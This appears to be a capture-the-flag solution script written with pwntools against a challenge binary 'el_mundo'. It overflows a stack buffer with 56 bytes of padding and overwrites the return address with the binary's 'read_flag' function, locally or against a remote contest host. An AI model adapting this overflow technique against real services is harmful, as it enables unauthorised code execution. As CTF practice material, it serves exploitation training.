from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./el_mundo")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

offset = 56

payload = b"".join([
    b"A"*offset,
    p64(elf.sym.read_flag)
])

io.sendlineafter("> ", payload)

io.interactive()
